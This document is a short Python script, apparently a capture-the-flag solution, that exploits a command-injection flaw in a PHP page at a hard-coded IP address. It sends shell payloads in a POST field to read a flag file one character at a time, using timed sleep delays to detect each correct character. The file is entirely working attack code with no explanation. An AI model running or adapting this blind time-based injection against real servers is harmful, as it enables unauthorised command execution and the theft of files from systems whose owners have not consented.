import requests
import string
import time

cookies = {
    'PHPSESSID': '8hba7voilc0rj475850fm1s5o1',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:47.0) Gecko/20100101 Firefox/47.0',
    'DNT': '1',
    'Referer': 'http://123.206.31.85:49165/index.php',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,en-GB;q=0.9,zh-TW;q=0.7,zh;q=0.6,zh-HK;q=0.4,en-US;q=0.3,en;q=0.',
}

an = ''
for i in range(100):
    for e in string.printable:
        data = "c=123;aa=`cat fLag_c2Rmc2Fncn-MzRzZGZnNDc.txt`;b='" + e + "';if [ ${aa:" + str(i) + ":1} == $b ];then sleep 4;fi"
        startTime = time.time()
        response = requests.post('http://123.206.31.85:49165/index.php', headers=headers, cookies=cookies, data={'c':data}, verify=False)
        #print(response.elapsed.total_seconds())
        if (time.time() - startTime > 4):
            an += e
            print(an)
            break